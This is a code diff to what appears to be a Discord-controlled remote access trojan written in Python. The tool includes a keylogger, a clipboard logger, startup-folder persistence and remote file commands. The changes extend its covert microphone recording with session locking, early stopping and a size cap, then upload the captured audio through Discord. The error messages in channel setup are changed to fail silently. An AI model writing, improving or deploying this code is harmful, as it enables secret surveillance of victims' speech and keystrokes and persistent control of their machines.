@@ -6,7 +6,7 @@ from Key_logging import Keylogger
 from urllib.parse import urlparse
 from discord.ext import commands
 
-TOKEN = 'TOKENHERE'
+TOKEN = 'TOKSTOKENHERE'
 BANNED_EXTENSIONS = {'.html', '.htm', '.exe', '.scr', '.cpl', '.doc', '.docx', '.jar'}
 
 intent = discord.Intents.all()
@@ -15,6 +15,7 @@ intent.message_content = True
 bot = commands.Bot(command_prefix=".", intents=intent)
 klogger = Keylogger()
 clogger = Cliplogger()
+activeRecording = {}
 prefix = '.'
 
 def get_current_userAndMachine():
@@ -334,18 +335,24 @@ async def rmv(ctx: commands.Context, file:str=None):
     except (OSError, Exception) as e:
         await ctx.send(f"{e}")
 
-async def recordmic(ctx: commands.Context, time):
+async def recordmic(ctx: commands.Context, time=None):
     try:
         if time is None or not str(time).isdigit():
             await ctx.send("enter the time and will be recorded in seconds `.recordmic <sec>`")
             return
 
         time = int(time)
+        guild = ctx.guild
+        if guild in activeRecording:
+            await ctx.send("mic recording session is running here, wait for it to finish")
+            return
+        
+        activeRecording[guild] = True
 
         FORMAT = pyaudio.paInt16
         CHANNEL = 1
-        RATE = 44100
-        CHUNK = 1024
+        RATE = 24000
+        CHUNK = 4096
         frames = []
 
         audio = pyaudio.PyAudio()
@@ -356,10 +363,18 @@ async def recordmic(ctx: commands.Context, time):
             input=True,
             frames_per_buffer=CHUNK
         )
-        await ctx.send(f"recording for {str(time)} seconds")
+        loop = asyncio.get_running_loop()
+        await ctx.send(f"recording for {str(time)} seconds, type `.stoprecord` to stop early")
         for i in range(0, int(RATE / CHUNK * time)):
-            data = stream.read(CHUNK)
-            frames.append(data)
+            if not activeRecording.get(guild, False):
+                await ctx.send("stopped by user request")
+                break
+            try:
+                data = await loop.run_in_executor(None, stream.read, CHUNK, False)
+                frames.append(data)
+            except Exception:
+                continue
+            await asyncio.sleep(0.001)
         await ctx.send(f"recording done! writing it..")
         stream.stop_stream()
         stream.close()
@@ -368,11 +383,19 @@ async def recordmic(ctx: commands.Context, time):
         timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
         name = f"recordmic_{timestamp}.wav"
 
+        MAXSIZE = 20 * 1024 * 1024
+        clean_frames = [f for f in frames if isinstance(f, bytes)]
+        all_frames = b''.join(clean_frames)
+
+        if len(all_frames) > MAXSIZE:
+            all_frames = all_frames[:MAXSIZE]
+            await ctx.send("file size is too long! cutting it..")
+
         wf = wave.open(name, 'wb')
         wf.setnchannels(CHANNEL)
         wf.setsampwidth(audio.get_sample_size(FORMAT))
         wf.setframerate(RATE)
-        wf.writeframes(b''.join(frames))
+        wf.writeframes(all_frames)
         wf.close()
 
         await ctx.send(content="**retrieved file is ready to play!**", file=discord.File(name))
@@ -380,7 +403,18 @@ async def recordmic(ctx: commands.Context, time):
         if os.path.exists(name):
             os.remove(name)
     except Exception as e:
-        await ctx.send(f"{e}")
+        await ctx.send(f"```audio error:\n{e}```")
+    finally:
+        if guild in activeRecording:
+            del activeRecording[guild]
+
+async def stoprecord(ctx: commands.Context):
+    guild = ctx.guild
+    if guild in activeRecording and activeRecording[guild]:
+        activeRecording[guild] = False
+        await ctx.send("stopped mic recording! wait the file to be processed")
+    else:
+        await ctx.send("no active mic recording session here!")
 
 async def MakeandJoinGuild(guild):
     bot_user, bot_machine = get_current_userAndMachine()
@@ -392,12 +426,12 @@ async def MakeandJoinGuild(guild):
             new_ch = await guild.create_text_channel(formatted_name)
             await new_ch.send("Hello! i'm ON!")
         except discord.Forbidden:
-            print("cannot make channel")
+            pass
     else:
         try:
             await existing_ch.send("I'm ON!")
         except discord.Forbidden:
-            print("cannot send messages")
+            pass
 
 async def CopytoStartUpFolder(ctx: commands.Context):
     ScriptPath = os.path.abspath(sys.executable)
@@ -430,6 +464,7 @@ async def help(ctx: commands.Context):
         ".size <file> :: calculate file size\n"
         ".addstartup :: add program to startup\n"
         ".recordmic <time> :: record audio and save it\n"
+        ".stoprecord :: stop audio recording and sends the result\n"
         "\n"
         "::FILE TRANSFER\n"
         ".download <file> [time] :: turns a file into downloadable link\n"
@@ -570,6 +605,8 @@ async def on_message(message):
             await help(ctx)
         elif command == ".addstartup":
             await CopytoStartUpFolder(ctx)
+        elif command == ".stoprecord":
+            await stoprecord(ctx)
 
         else:
             await ctx.send(f"unknown command '{command}', type '.help' for help")
